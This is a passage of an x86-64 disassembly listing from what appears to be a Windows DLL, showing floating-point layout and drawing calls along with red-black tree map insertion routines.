   1800016cb:	80 fa 23             	cmp    $0x23,%dl
   1800016ce:	75 04                	jne    0x1800016d4
   1800016d0:	38 10                	cmp    %dl,(%rax)
   1800016d2:	74 09                	je     0x1800016dd
   1800016d4:	48 8b c8             	mov    %rax,%rcx
   1800016d7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800016db:	72 e3                	jb     0x1800016c0
   1800016dd:	45 33 ed             	xor    %r13d,%r13d
   1800016e0:	45 0f 57 ed          	xorps  %xmm13,%xmm13
   1800016e4:	4c 3b f1             	cmp    %rcx,%r14
   1800016e7:	75 06                	jne    0x1800016ef
   1800016e9:	45 0f 57 f6          	xorps  %xmm14,%xmm14
   1800016ed:	eb 59                	jmp    0x180001748
   1800016ef:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   1800016f4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800016f9:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1800016fe:	f3 0f 10 05 ca a4 04 	movss  0x4a4ca(%rip),%xmm0        # 0x18004bbd0
   180001705:	00 
   180001706:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%rsp)
   18000170c:	f3 0f 10 1d b0 a4 04 	movss  0x4a4b0(%rip),%xmm3        # 0x18004bbc4
   180001713:	00 
   180001714:	f3 0f 10 93 10 19 00 	movss  0x1910(%rbx),%xmm2
   18000171b:	00 
   18000171c:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180001721:	48 8b 8b 08 19 00 00 	mov    0x1908(%rbx),%rcx
   180001728:	e8 d3 54 02 00       	call   0x180026c00
   18000172d:	f3 0f 10 44 24 48    	movss  0x48(%rsp),%xmm0
   180001733:	f3 0f 58 05 c5 a3 04 	addss  0x4a3c5(%rip),%xmm0        # 0x18004bb00
   18000173a:	00 
   18000173b:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   18000173f:	66 44 0f 6e f0       	movd   %eax,%xmm14
   180001744:	45 0f 5b f6          	cvtdq2ps %xmm14,%xmm14
   180001748:	f3 41 0f 10 97 d0 00 	movss  0xd0(%r15),%xmm2
   18000174f:	00 00 
   180001751:	f3 45 0f 10 a7 d4 00 	movss  0xd4(%r15),%xmm12
   180001758:	00 00 
   18000175a:	41 0f 28 dc          	movaps %xmm12,%xmm3
   18000175e:	f3 0f 58 1d 0a a4 04 	addss  0x4a40a(%rip),%xmm3        # 0x18004bb70
   180001765:	00 
   180001766:	0f 28 c2             	movaps %xmm2,%xmm0
   180001769:	f3 0f 58 05 13 a4 04 	addss  0x4a413(%rip),%xmm0        # 0x18004bb84
   180001770:	00 
   180001771:	f3 0f 11 54 24 48    	movss  %xmm2,0x48(%rsp)
   180001777:	f3 44 0f 11 64 24 4c 	movss  %xmm12,0x4c(%rsp)
   18000177e:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%rsp)
   180001784:	f3 0f 11 5c 24 54    	movss  %xmm3,0x54(%rsp)
   18000178a:	f3 0f 58 05 b2 a3 04 	addss  0x4a3b2(%rip),%xmm0        # 0x18004bb44
   180001791:	00 
   180001792:	f3 41 0f 58 c6       	addss  %xmm14,%xmm0
   180001797:	f3 0f 11 55 88       	movss  %xmm2,-0x78(%rbp)
   18000179c:	f3 44 0f 11 65 8c    	movss  %xmm12,-0x74(%rbp)
   1800017a2:	f3 0f 11 45 90       	movss  %xmm0,-0x70(%rbp)
   1800017a7:	f3 0f 11 5d 94       	movss  %xmm3,-0x6c(%rbp)
   1800017ac:	f3 0f 5c c2          	subss  %xmm2,%xmm0
   1800017b0:	f3 0f 11 44 24 40    	movss  %xmm0,0x40(%rsp)
   1800017b6:	f3 41 0f 5c dc       	subss  %xmm12,%xmm3
   1800017bb:	f3 0f 11 5c 24 44    	movss  %xmm3,0x44(%rsp)
   1800017c1:	f3 0f 10 8e 94 15 00 	movss  0x1594(%rsi),%xmm1
   1800017c8:	00 
   1800017c9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800017ce:	e8 cd 51 00 00       	call   0x1800069a0
   1800017d3:	45 33 c0             	xor    %r8d,%r8d
   1800017d6:	8b d7                	mov    %edi,%edx
   1800017d8:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   1800017dc:	e8 ff 52 00 00       	call   0x180006ae0
   1800017e1:	84 c0                	test   %al,%al
   1800017e3:	0f 84 c4 04 00 00    	je     0x180001cad
   1800017e9:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
   1800017ee:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1800017f3:	4c 8d 44 24 59       	lea    0x59(%rsp),%r8
   1800017f8:	8b d7                	mov    %edi,%edx
   1800017fa:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1800017ff:	e8 dc 94 02 00       	call   0x18002ace0
   180001804:	44 0f b6 e8          	movzbl %al,%r13d
   180001808:	84 c0                	test   %al,%al
   18000180a:	74 5b                	je     0x180001867
   18000180c:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   180001811:	0f 94 c1             	sete   %cl
   180001814:	41 88 0c 24          	mov    %cl,(%r12)
   180001818:	48 8b 1d b1 b5 07 00 	mov    0x7b5b1(%rip),%rbx        # 0x18007cdd0
   18000181f:	8b 8b 60 1a 00 00    	mov    0x1a60(%rbx),%ecx
   180001825:	3b cf                	cmp    %edi,%ecx
   180001827:	74 27                	je     0x180001850
   180001829:	85 c9                	test   %ecx,%ecx
   18000182b:	74 23                	je     0x180001850
   18000182d:	80 bb 94 1e 00 00 00 	cmpb   $0x0,0x1e94(%rbx)
   180001834:	75 1a                	jne    0x180001850
   180001836:	41 b8 e8 0a 00 00    	mov    $0xae8,%r8d
   18000183c:	48 8d 15 bd 00 04 00 	lea    0x400bd(%rip),%rdx        # 0x180041900
   180001843:	48 8d 0d d6 01 04 00 	lea    0x401d6(%rip),%rcx        # 0x180041a20
   18000184a:	ff 15 40 fc 03 00    	call   *0x3fc40(%rip)        # 0x180041490
   180001850:	66 c7 83 6f 1a 00 00 	movw   $0x101,0x1a6f(%rbx)
   180001857:	01 01 
   180001859:	48 8b 83 18 1a 00 00 	mov    0x1a18(%rbx),%rax
   180001860:	83 88 14 01 00 00 04 	orl    $0x4,0x114(%rax)
   180001867:	8b 0d 37 b5 07 00    	mov    0x7b537(%rip),%ecx        # 0x18007cda4
   18000186d:	65 48 8b 04 25 58 00 	mov    %gs:0x58,%rax
   180001874:	00 00 
   180001876:	ba 04 00 00 00       	mov    $0x4,%edx
   18000187b:	48 8b 04 c8          	mov    (%rax,%rcx,8),%rax
   18000187f:	8b 04 02             	mov    (%rdx,%rax,1),%eax
   180001882:	39 05 28 bb 07 00    	cmp    %eax,0x7bb28(%rip)        # 0x18007d3b0
   180001888:	7e 60                	jle    0x1800018ea
   18000188a:	48 8d 0d 1f bb 07 00 	lea    0x7bb1f(%rip),%rcx        # 0x18007d3b0
   180001891:	e8 92 d2 03 00       	call   0x18003eb28
   180001896:	83 3d 13 bb 07 00 ff 	cmpl   $0xffffffff,0x7bb13(%rip)        # 0x18007d3b0
   18000189d:	75 4b                	jne    0x1800018ea
   18000189f:	33 c0                	xor    %eax,%eax
   1800018a1:	48 89 05 10 bb 07 00 	mov    %rax,0x7bb10(%rip)        # 0x18007d3b8
   1800018a8:	48 89 05 11 bb 07 00 	mov    %rax,0x7bb11(%rip)        # 0x18007d3c0
   1800018af:	b9 28 00 00 00       	mov    $0x28,%ecx
   1800018b4:	e8 eb d2 03 00       	call   0x18003eba4
   1800018b9:	48 89 00             	mov    %rax,(%rax)
   1800018bc:	48 89 40 08          	mov    %rax,0x8(%rax)
   1800018c0:	48 89 40 10          	mov    %rax,0x10(%rax)
   1800018c4:	66 c7 40 18 01 01    	movw   $0x101,0x18(%rax)
   1800018ca:	48 89 05 e7 ba 07 00 	mov    %rax,0x7bae7(%rip)        # 0x18007d3b8
   1800018d1:	48 8d 0d 98 ea 03 00 	lea    0x3ea98(%rip),%rcx        # 0x180040370
   1800018d8:	e8 5b d6 03 00       	call   0x18003ef38
   1800018dd:	90                   	nop
   1800018de:	48 8d 0d cb ba 07 00 	lea    0x7bacb(%rip),%rcx        # 0x18007d3b0
   1800018e5:	e8 d2 d1 03 00       	call   0x18003eabc
   1800018ea:	48 8b 35 c7 ba 07 00 	mov    0x7bac7(%rip),%rsi        # 0x18007d3b8
   1800018f1:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   1800018f5:	48 8b de             	mov    %rsi,%rbx
   1800018f8:	44 0f b6 52 19       	movzbl 0x19(%rdx),%r10d
   1800018fd:	45 84 d2             	test   %r10b,%r10b
   180001900:	75 1a                	jne    0x18000191c
   180001902:	48 8b c2             	mov    %rdx,%rax
   180001905:	39 78 1c             	cmp    %edi,0x1c(%rax)
   180001908:	73 06                	jae    0x180001910
   18000190a:	48 83 c0 10          	add    $0x10,%rax
   18000190e:	eb 03                	jmp    0x180001913
   180001910:	48 8b d8             	mov    %rax,%rbx
   180001913:	48 8b 00             	mov    (%rax),%rax
   180001916:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   18000191a:	74 e9                	je     0x180001905
   18000191c:	80 7b 19 00          	cmpb   $0x0,0x19(%rbx)
   180001920:	75 05                	jne    0x180001927
   180001922:	3b 7b 1c             	cmp    0x1c(%rbx),%edi
   180001925:	73 03                	jae    0x18000192a
   180001927:	48 8b de             	mov    %rsi,%rbx
   18000192a:	48 3b de             	cmp    %rsi,%rbx
   18000192d:	0f 85 03 01 00 00    	jne    0x180001a36
   180001933:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   180001937:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%rsp)
   18000193e:	00 
   18000193f:	33 c9                	xor    %ecx,%ecx
   180001941:	4c 8b c6             	mov    %rsi,%r8
   180001944:	44 8b cf             	mov    %edi,%r9d
   180001947:	45 84 d2             	test   %r10b,%r10b
   18000194a:	75 28                	jne    0x180001974
   18000194c:	48 8b c2             	mov    %rdx,%rax
   18000194f:	90                   	nop
   180001950:	48 8b d0             	mov    %rax,%rdx
   180001953:	39 78 1c             	cmp    %edi,0x1c(%rax)
   180001956:	73 08                	jae    0x180001960
   180001958:	33 c9                	xor    %ecx,%ecx
   18000195a:	48 83 c0 10          	add    $0x10,%rax
   18000195e:	eb 08                	jmp    0x180001968
   180001960:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001965:	4c 8b c0             	mov    %rax,%r8
   180001968:	48 8b 00             	mov    (%rax),%rax
   18000196b:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   18000196f:	74 df                	je     0x180001950
   180001971:	44 8b cf             	mov    %edi,%r9d
   180001974:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   180001979:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   18000197d:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   180001981:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   180001985:	41 80 78 19 00       	cmpb   $0x0,0x19(%r8)
   18000198a:	75 06                	jne    0x180001992
   18000198c:	45 3b 48 1c          	cmp    0x1c(%r8),%r9d
   180001990:	73 72                	jae    0x180001a04
   180001992:	48 b8 66 66 66 66 66 	movabs $0x666666666666666,%rax
   180001999:	66 66 06 
   18000199c:	48 39 05 1d ba 07 00 	cmp    %rax,0x7ba1d(%rip)        # 0x18007d3c0
   1800019a3:	0f 84 55 03 00 00    	je     0x180001cfe
   1800019a9:	48 8d 1d 08 ba 07 00 	lea    0x7ba08(%rip),%rbx        # 0x18007d3b8
   1800019b0:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   1800019b5:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1800019bc:	00 00 
   1800019be:	b9 28 00 00 00       	mov    $0x28,%ecx
   1800019c3:	e8 dc d1 03 00       	call   0x18003eba4
   1800019c8:	90                   	nop
   1800019c9:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800019ce:	48 89 50 1c          	mov    %rdx,0x1c(%rax)
   1800019d2:	48 89 30             	mov    %rsi,(%rax)
   1800019d5:	48 89 70 08          	mov    %rsi,0x8(%rax)
   1800019d9:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1800019dd:	66 c7 40 18 00 00    	movw   $0x0,0x18(%rax)
   1800019e3:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1800019e8:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   1800019ed:	4c 8b c0             	mov    %rax,%r8
   1800019f0:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800019f5:	48 8b cb             	mov    %rbx,%rcx
   1800019f8:	e8 63 03 00 00       	call   0x180001d60
   1800019fd:	48 8b 35 b4 b9 07 00 	mov    0x7b9b4(%rip),%rsi        # 0x18007d3b8
   180001a04:	48 8b 46 08          	mov    0x8(%rsi),%rax
   180001a08:	48 8b de             	mov    %rsi,%rbx
   180001a0b:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180001a0f:	75 17                	jne    0x180001a28
   180001a11:	39 78 1c             	cmp    %edi,0x1c(%rax)
   180001a14:	73 06                	jae    0x180001a1c
   180001a16:	48 83 c0 10          	add    $0x10,%rax
   180001a1a:	eb 03                	jmp    0x180001a1f
   180001a1c:	48 8b d8             	mov    %rax,%rbx
   180001a1f:	48 8b 00             	mov    (%rax),%rax
   180001a22:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180001a26:	74 e9                	je     0x180001a11
   180001a28:	80 7b 19 00          	cmpb   $0x0,0x19(%rbx)
   180001a2c:	75 05                	jne    0x180001a33
   180001a2e:	3b 7b 1c             	cmp    0x1c(%rbx),%edi
   180001a31:	73 03                	jae    0x180001a36
   180001a33:	48 8b de             	mov    %rsi,%rbx
   180001a36:	48 83 3d 92 b3 07 00 	cmpq   $0x0,0x7b392(%rip)        # 0x18007cdd0
   180001a3d:	00 
   180001a3e:	75 1a                	jne    0x180001a5a
   180001a40:	41 b8 58 0c 00 00    	mov    $0xc58,%r8d
   180001a46:	48 8d 15 b3 fe 03 00 	lea    0x3feb3(%rip),%rdx        # 0x180041900
   180001a4d:	48 8d 0d 3c 00 04 00 	lea    0x4003c(%rip),%rcx        # 0x180041a90
   180001a54:	ff 15 36 fa 03 00    	call   *0x3fa36(%rip)        # 0x180041490
   180001a5a:	48 8b 05 6f b3 07 00 	mov    0x7b36f(%rip),%rax        # 0x18007cdd0
   180001a61:	f3 0f 10 48 18       	movss  0x18(%rax),%xmm1
   180001a66:	f3 0f 59 0d 1a a1 04 	mulss  0x4a11a(%rip),%xmm1        # 0x18004bb88
   180001a6d:	00 
   180001a6e:	f3 0f 10 05 86 a0 04 	movss  0x4a086(%rip),%xmm0        # 0x18004bafc
   180001a75:	00 
   180001a76:	e8 f3 e2 03 00       	call   0x18003fd6e
   180001a7b:	f3 0f 10 0d 81 a0 04 	movss  0x4a081(%rip),%xmm1        # 0x18004bb04
   180001a82:	00 
   180001a83:	f3 0f 5c c8          	subss  %xmm0,%xmm1
   180001a87:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   180001a8c:	74 0a                	je     0x180001a98
   180001a8e:	f3 0f 10 15 6e a0 04 	movss  0x4a06e(%rip),%xmm2        # 0x18004bb04
   180001a95:	00 
   180001a96:	eb 04                	jmp    0x180001a9c
   180001a98:	41 0f 28 d5          	movaps %xmm13,%xmm2
   180001a9c:	f3 0f 5c 53 20       	subss  0x20(%rbx),%xmm2
   180001aa1:	f3 0f 59 d1          	mulss  %xmm1,%xmm2
   180001aa5:	f3 0f 58 53 20       	addss  0x20(%rbx),%xmm2
   180001aaa:	f3 0f 11 53 20       	movss  %xmm2,0x20(%rbx)
   180001aaf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180001ab5:	8b d7                	mov    %edi,%edx
   180001ab7:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   180001abb:	e8 a0 3f 00 00       	call   0x180005a60
   180001ac0:	f3 44 0f 10 4c 24 48 	movss  0x48(%rsp),%xmm9
   180001ac7:	45 0f 28 d9          	movaps %xmm9,%xmm11
   180001acb:	f3 44 0f 58 1d ac a0 	addss  0x4a0ac(%rip),%xmm11        # 0x18004bb80
   180001ad2:	04 00 
   180001ad4:	f3 44 0f 10 44 24 4c 	movss  0x4c(%rsp),%xmm8
   180001adb:	41 0f 28 f8          	movaps %xmm8,%xmm7
   180001adf:	f3 0f 58 3d 81 a0 04 	addss  0x4a081(%rip),%xmm7        # 0x18004bb68
   180001ae6:	00 
   180001ae7:	66 0f 6f 05 f1 a1 04 	movdqa 0x4a1f1(%rip),%xmm0        # 0x18004bce0
   180001aee:	00 
   180001aef:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   180001af4:	f3 44 0f 11 5c 24 40 	movss  %xmm11,0x40(%rsp)
   180001afb:	f3 0f 11 7c 24 44    	movss  %xmm7,0x44(%rsp)
   180001b01:	f3 44 0f 11 4c 24 48 	movss  %xmm9,0x48(%rsp)
   180001b08:	f3 44 0f 11 44 24 4c 	movss  %xmm8,0x4c(%rsp)
   180001b0f:	4c 8b 05 ba b2 07 00 	mov    0x7b2ba(%rip),%r8        # 0x18007cdd0
   180001b16:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180001b1b:	e8 70 20 00 00       	call   0x180003b90
   180001b20:	44 8b c8             	mov    %eax,%r9d
   180001b23:	49 8b 88 18 1a 00 00 	mov    0x1a18(%r8),%rcx
   180001b2a:	c7 44 24 28 0f 00 00 	movl   $0xf,0x28(%rsp)
   180001b31:	00 
   180001b32:	f3 0f 10 35 1a a0 04 	movss  0x4a01a(%rip),%xmm6        # 0x18004bb54
   180001b39:	00 
   180001b3a:	f3 0f 11 74 24 20    	movss  %xmm6,0x20(%rsp)
   180001b40:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180001b45:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180001b4a:	48 8b 89 a8 02 00 00 	mov    0x2a8(%rcx),%rcx
   180001b51:	e8 ea 0c 02 00       	call   0x180022840
   180001b56:	c7 45 88 91 ed 7c 3f 	movl   $0x3f7ced91,-0x78(%rbp)
   180001b5d:	c7 45 8c c9 76 1e 3f 	movl   $0x3f1e76c9,-0x74(%rbp)
   180001b64:	c7 45 90 00 00 80 3f 	movl   $0x3f800000,-0x70(%rbp)
   180001b6b:	f3 0f 10 43 20       	movss  0x20(%rbx),%xmm0
   180001b70:	f3 0f 11 45 94       	movss  %xmm0,-0x6c(%rbp)
   180001b75:	f3 44 0f 11 5c 24 48 	movss  %xmm11,0x48(%rsp)
   180001b7c:	f3 0f 11 7c 24 4c    	movss  %xmm7,0x4c(%rsp)
   180001b82:	f3 44 0f 11 4c 24 40 	movss  %xmm9,0x40(%rsp)
   180001b89:	f3 44 0f 11 44 24 44 	movss  %xmm8,0x44(%rsp)
   180001b90:	4c 8b 05 39 b2 07 00 	mov    0x7b239(%rip),%r8        # 0x18007cdd0
   180001b97:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   180001b9b:	e8 f0 1f 00 00       	call   0x180003b90
   180001ba0:	44 8b c8             	mov    %eax,%r9d
   180001ba3:	49 8b 88 18 1a 00 00 	mov    0x1a18(%r8),%rcx
   180001baa:	c7 44 24 28 0f 00 00 	movl   $0xf,0x28(%rsp)
   180001bb1:	00 
   180001bb2:	f3 0f 11 74 24 20    	movss  %xmm6,0x20(%rsp)
   180001bb8:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   180001bbd:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001bc2:	48 8b 89 a8 02 00 00 	mov    0x2a8(%rcx),%rcx
   180001bc9:	e8 72 0c 02 00       	call   0x180022840
   180001bce:	49 8b bf a8 02 00 00 	mov    0x2a8(%r15),%rdi
   180001bd5:	66 0f 6f 05 13 a1 04 	movdqa 0x4a113(%rip),%xmm0        # 0x18004bcf0
   180001bdc:	00 
   180001bdd:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   180001be2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180001be7:	e8 a4 1f 00 00       	call   0x180003b90
   180001bec:	8b f0                	mov    %eax,%esi
   180001bee:	f3 0f 10 4b 20       	movss  0x20(%rbx),%xmm1
   180001bf3:	f3 0f 59 0d 69 9f 04 	mulss  0x49f69(%rip),%xmm1        # 0x18004bb64
   180001bfa:	00 
   180001bfb:	f3 44 0f 58 0d 48 9f 	addss  0x49f48(%rip),%xmm9        # 0x18004bb4c
   180001c02:	04 00 
   180001c04:	f3 41 0f 58 c9       	addss  %xmm9,%xmm1
   180001c09:	f3 0f 11 4c 24 48    	movss  %xmm1,0x48(%rsp)
   180001c0f:	f3 44 0f 58 05 34 9f 	addss  0x49f34(%rip),%xmm8        # 0x18004bb4c
   180001c16:	04 00 
   180001c18:	f3 44 0f 11 44 24 4c 	movss  %xmm8,0x4c(%rsp)
   180001c1f:	a9 00 00 00 ff       	test   $0xff000000,%eax
   180001c24:	74 52                	je     0x180001c78
   180001c26:	c7 44 24 28 1d 00 00 	movl   $0x1d,0x28(%rsp)
   180001c2d:	00 
   180001c2e:	f3 0f 10 05 12 9f 04 	movss  0x49f12(%rip),%xmm0        # 0x18004bb48
   180001c35:	00 
   180001c36:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%rsp)
   180001c3c:	41 0f 28 dd          	movaps %xmm13,%xmm3
   180001c40:	f3 0f 10 15 f4 9e 04 	movss  0x49ef4(%rip),%xmm2        # 0x18004bb3c
   180001c47:	00 
   180001c48:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180001c4d:	48 8b cf             	mov    %rdi,%rcx
   180001c50:	e8 fb 03 02 00       	call   0x180022050
   180001c55:	44 8b ce             	mov    %esi,%r9d
   180001c58:	44 8b 87 80 00 00 00 	mov    0x80(%rdi),%r8d
   180001c5f:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   180001c66:	48 8b cf             	mov    %rdi,%rcx
   180001c69:	e8 e2 fb 01 00       	call   0x180021850
   180001c6e:	c7 87 80 00 00 00 00 	movl   $0x0,0x80(%rdi)
   180001c75:	00 00 00 
   180001c78:	45 0f 2f f5          	comiss %xmm13,%xmm14
   180001c7c:	76 29                	jbe    0x180001ca7
   180001c7e:	f3 44 0f 58 1d bd 9e 	addss  0x49ebd(%rip),%xmm11        # 0x18004bb44
   180001c85:	04 00 
   180001c87:	f3 44 0f 58 25 74 9e 	addss  0x49e74(%rip),%xmm12        # 0x18004bb04
   180001c8e:	04 00 
   180001c90:	41 b1 01             	mov    $0x1,%r9b
   180001c93:	45 33 c0             	xor    %r8d,%r8d
   180001c96:	49 8b d6             	mov    %r14,%rdx
   180001c99:	45 0f 14 dc          	unpcklps %xmm12,%xmm11
   180001c9d:	66 4c 0f 7e d9       	movq   %xmm11,%rcx
   180001ca2:	e8 c9 23 00 00       	call   0x180004070
   180001ca7:	41 0f b6 c5          	movzbl %r13b,%eax
   180001cab:	eb 02                	jmp    0x180001caf
   180001cad:	32 c0                	xor    %al,%al
   180001caf:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   180001cb3:	48 33 cc             	xor    %rsp,%rcx
   180001cb6:	e8 a5 cd 03 00       	call   0x18003ea60
   180001cbb:	4c 8d 9c 24 20 01 00 	lea    0x120(%rsp),%r11
   180001cc2:	00 
   180001cc3:	49 8b 5b 50          	mov    0x50(%r11),%rbx
   180001cc7:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   180001ccc:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   180001cd1:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   180001cd6:	45 0f 28 4b c0       	movaps -0x40(%r11),%xmm9
   180001cdb:	45 0f 28 5b b0       	movaps -0x50(%r11),%xmm11
   180001ce0:	45 0f 28 63 a0       	movaps -0x60(%r11),%xmm12
   180001ce5:	45 0f 28 6b 90       	movaps -0x70(%r11),%xmm13
   180001cea:	45 0f 28 73 80       	movaps -0x80(%r11),%xmm14
   180001cef:	49 8b e3             	mov    %r11,%rsp
   180001cf2:	41 5f                	pop    %r15
   180001cf4:	41 5e                	pop    %r14
   180001cf6:	41 5d                	pop    %r13
   180001cf8:	41 5c                	pop    %r12
   180001cfa:	5f                   	pop    %rdi
   180001cfb:	5e                   	pop    %rsi
   180001cfc:	5d                   	pop    %rbp
   180001cfd:	c3                   	ret
   180001cfe:	e8 9d f8 ff ff       	call   0x1800015a0
   180001d03:	cc                   	int3
   180001d04:	cc                   	int3
   180001d05:	cc                   	int3
   180001d06:	cc                   	int3
   180001d07:	cc                   	int3
   180001d08:	cc                   	int3
   180001d09:	cc                   	int3
   180001d0a:	cc                   	int3
   180001d0b:	cc                   	int3
   180001d0c:	cc                   	int3
   180001d0d:	cc                   	int3
   180001d0e:	cc                   	int3
   180001d0f:	cc                   	int3
   180001d10:	40 53                	rex push %rbx
   180001d12:	56                   	push   %rsi
   180001d13:	57                   	push   %rdi
   180001d14:	48 83 ec 20          	sub    $0x20,%rsp
   180001d18:	41 80 78 19 00       	cmpb   $0x0,0x19(%r8)
   180001d1d:	49 8b d8             	mov    %r8,%rbx
   180001d20:	48 8b f2             	mov    %rdx,%rsi
   180001d23:	48 8b f9             	mov    %rcx,%rdi
   180001d26:	75 2d                	jne    0x180001d55
   180001d28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001d2f:	00 
   180001d30:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   180001d34:	48 8b d6             	mov    %rsi,%rdx
   180001d37:	48 8b cf             	mov    %rdi,%rcx
   180001d3a:	e8 d1 ff ff ff       	call   0x180001d10
   180001d3f:	48 8b cb             	mov    %rbx,%rcx
   180001d42:	ba 28 00 00 00       	mov    $0x28,%edx
   180001d47:	48 8b 1b             	mov    (%rbx),%rbx
   180001d4a:	e8 09 d2 03 00       	call   0x18003ef58
   180001d4f:	80 7b 19 00          	cmpb   $0x0,0x19(%rbx)
   180001d53:	74 db                	je     0x180001d30
   180001d55:	48 83 c4 20          	add    $0x20,%rsp
   180001d59:	5f                   	pop    %rdi
   180001d5a:	5e                   	pop    %rsi
   180001d5b:	5b                   	pop    %rbx
   180001d5c:	c3                   	ret
   180001d5d:	cc                   	int3
   180001d5e:	cc                   	int3
   180001d5f:	cc                   	int3
   180001d60:	48 ff 41 08          	incq   0x8(%rcx)
   180001d64:	4d 8b c8             	mov    %r8,%r9
   180001d67:	4c 8b 19             	mov    (%rcx),%r11
   180001d6a:	4c 8b d1             	mov    %rcx,%r10
   180001d6d:	48 8b 02             	mov    (%rdx),%rax
   180001d70:	49 89 40 08          	mov    %rax,0x8(%r8)
   180001d74:	49 3b c3             	cmp    %r11,%rax
   180001d77:	75 14                	jne    0x180001d8d
   180001d79:	4d 89 03             	mov    %r8,(%r11)
   180001d7c:	49 8b c0             	mov    %r8,%rax
   180001d7f:	4d 89 43 08          	mov    %r8,0x8(%r11)
   180001d83:	4d 89 43 10          	mov    %r8,0x10(%r11)
   180001d87:	41 c6 40 18 01       	movb   $0x1,0x18(%r8)
   180001d8c:	c3                   	ret
   180001d8d:	83 7a 08 00          	cmpl   $0x0,0x8(%rdx)
   180001d91:	75 10                	jne    0x180001da3
   180001d93:	4c 89 48 10          	mov    %r9,0x10(%rax)
   180001d97:	49 3b 43 10          	cmp    0x10(%r11),%rax
   180001d9b:	75 11                	jne    0x180001dae
   180001d9d:	4d 89 4b 10          	mov    %r9,0x10(%r11)
   180001da1:	eb 0b                	jmp    0x180001dae
   180001da3:	4c 89 08             	mov    %r9,(%rax)
   180001da6:	49 3b 03             	cmp    (%r11),%rax
   180001da9:	75 03                	jne    0x180001dae
   180001dab:	4d 89 0b             	mov    %r9,(%r11)
   180001dae:	49 8b 40 08          	mov    0x8(%r8),%rax
   180001db2:	49 8b d1             	mov    %r9,%rdx
   180001db5:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   180001db9:	0f 85 f0 01 00 00    	jne    0x180001faf
   180001dbf:	90                   	nop
   180001dc0:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001dc4:	4c 8b 40 08          	mov    0x8(%rax),%r8
   180001dc8:	49 8b 08             	mov    (%r8),%rcx
   180001dcb:	48 3b c1             	cmp    %rcx,%rax
   180001dce:	0f 85 f0 00 00 00    	jne    0x180001ec4
   180001dd4:	49 8b 48 10          	mov    0x10(%r8),%rcx
   180001dd8:	80 79 18 00          	cmpb   $0x0,0x18(%rcx)
   180001ddc:	75 21                	jne    0x180001dff
   180001dde:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001de2:	c6 41 18 01          	movb   $0x1,0x18(%rcx)
   180001de6:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001dea:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001dee:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180001df2:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001df6:	48 8b 50 08          	mov    0x8(%rax),%rdx
   180001dfa:	e9 a2 01 00 00       	jmp    0x180001fa1
   180001dff:	4c 8b 40 10          	mov    0x10(%rax),%r8
   180001e03:	49 3b d0             	cmp    %r8,%rdx
   180001e06:	75 47                	jne    0x180001e4f
   180001e08:	49 8b 08             	mov    (%r8),%rcx
   180001e0b:	48 8b d0             	mov    %rax,%rdx
   180001e0e:	48 89 48 10          	mov    %rcx,0x10(%rax)
   180001e12:	49 8b 08             	mov    (%r8),%rcx
   180001e15:	80 79 19 00          	cmpb   $0x0,0x19(%rcx)
   180001e19:	75 04                	jne    0x180001e1f
   180001e1b:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001e1f:	48 8b 48 08          	mov    0x8(%rax),%rcx
